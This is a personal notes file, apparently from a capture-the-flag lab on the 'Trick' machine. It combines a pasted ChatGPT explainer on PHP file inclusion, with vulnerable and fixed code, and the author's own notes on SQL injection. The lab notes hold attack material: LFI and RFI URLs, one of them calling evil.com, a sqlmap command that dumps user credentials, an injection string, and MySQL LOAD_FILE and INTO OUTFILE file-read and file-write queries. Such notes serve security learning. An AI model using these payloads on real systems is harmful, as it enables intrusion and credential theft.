ChatGPT
File Inclusion Vulnerability in PHP

File inclusion vulnerabilities occur when a PHP application dynamically includes files based on user input. If not properly validated, this can allow attackers to include arbitrary files from the server or even remote files, leading to serious security risks like information disclosure, code execution, and more.
1. Vulnerable Code Example

Let's consider an example where the application includes a page based on a GET parameter:

php

<?php
// Vulnerable code
$page = $_GET['page'];
include($page);
?>

If the page parameter is not properly validated, an attacker could exploit this by passing a malicious file path.

Example of exploitation:

    Local File Inclusion (LFI): An attacker could include a sensitive file from the server, such as /etc/passwd on a Unix system:

    bash

http://example.com/vulnerable.php?page=/etc/passwd

Remote File Inclusion (RFI): If allow_url_include is enabled in php.ini, an attacker could include a file from a remote server:

bash

    http://example.com/vulnerable.php?page=http://evil.com/malicious.php

2. Secure Code Example

To prevent file inclusion vulnerabilities, you should always validate and sanitize the input. One common approach is to use a whitelist of allowed files:

php

<?php
// Secure code
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages)) {
    include($page . '.php');
} else {
    // Handle error or redirect to a default page
    include('404.php');
}
?>

Why this is secure:

    Whitelist Validation: Only files specified in the $allowed_pages array are allowed, preventing arbitrary file inclusion.
    Appending .php: Limits the inclusion to files within the application, avoiding paths like /etc/passwd.

Additional Security Considerations
Vulnerable Approaches:

    Directly Using User Input Without Validation:

    php

include($_GET['file']);

    Risk: High, as it directly uses user input without checks.

File Path Manipulation:

php

    $file = $_GET['file'];
    include("/var/www/html/$file");

        Risk: An attacker can use directory traversal (../../etc/passwd) to include files outside the intended directory.

More Secure Approaches:

    Using Absolute Paths:

    php

$page = basename($_GET['page']);
include("/var/www/html/pages/$page.php");

    Why it’s secure: basename() strips directory paths, preventing directory traversal attacks.

Disabling Remote File Inclusion:
Ensure that allow_url_include is disabled in php.ini:

ini

allow_url_include = Off

Using require Instead of include:

php

require('home.php');

    Why it’s secure: require will halt script execution if the file is not found, reducing the impact of an attack.




// notes 

GET /index.php?page=position HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=bn7cdggkltmdiec12ugdu24ka4
Upgrade-Insecure-Requests: 1

we can't perform sql injection file inlcude after become parameter

sqlmap -r login.req --batch -D payroll_db -T users -C name,username,password --dump  --technique=BEU --level 5 --risk 3



POST /ajax.php?action=save_deductions HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------1360122800540851915535553454
Content-Length: 409
Origin: http://preprod-payroll.trick.htb
Connection: keep-alive
Referer: http://preprod-payroll.trick.htb/index.php?page=deductions
Cookie: PHPSESSID=bn7cdggkltmdiec12ugdu24ka4

-----------------------------1360122800540851915535553454
Content-Disposition: form-data; name="id"

4
-----------------------------1360122800540851915535553454
Content-Disposition: form-data; name="deduction"

hacker'
-----------------------------1360122800540851915535553454
Content-Disposition: form-data; name="description"

hacker
-----------------------------1360122800540851915535553454--

# notes

after putting ' quote on hacker' then server return error but again put ' then server controlled i realized this is ' error based command injection 
to control the query i tried hacker' OR 1=1-- - then success 



# notes 

when file privilegs setup on sql db then we can easility read senstive data from database and senstive file 



# if file privilege setupon database 

In the context of a database, if a user has the FILE privilege, it grants them the ability to read and write files on the server where the database is running. This can be a significant privilege with potential security implications, as it allows the user to interact with the filesystem directly from the database.
What You Can Do with the FILE Privilege

    Read Files:
        The user can read any file on the server that the database server has read access to. This includes sensitive files like configuration files, logs, or even user data stored on the server.
        Example of reading a file:

        sql

    SELECT LOAD_FILE('/etc/passwd');

    This SQL command would attempt to read the /etc/passwd file on a Unix-like system and return its contents.

Write Files:

    The user can also write data to files on the server. This could be used to create new files or overwrite existing ones, which could potentially lead to system compromise if, for example, they write malicious code to a web-accessible directory.
    Example of writing to a file:

    sql

    SELECT 'Some text' INTO OUTFILE '/path/to/file.txt';

    This command writes "Some text" to the specified file path.

Import Data from Files:

    The FILE privilege also allows users to import data from files into the database using commands like LOAD DATA INFILE.
    Example of importing data:

    sql

        LOAD DATA INFILE '/path/to/data.csv' INTO TABLE table_name;

        This command imports data from a CSV file into a specified table.

Security Implications

    Sensitive Information Exposure: The ability to read files can expose sensitive information, such as configuration files (my.cnf, .htpasswd, etc.), user data, or credentials stored on the server.

    Potential System Compromise: Writing to files could allow a user to create or modify scripts or other files that could be executed by the server, leading to a full system compromise.

    Database Server Permissions: The scope of what can be read or written depends on the permissions of the database server process. The database process typically runs with its own user privileges, so it can only read/write files that this user has access to.
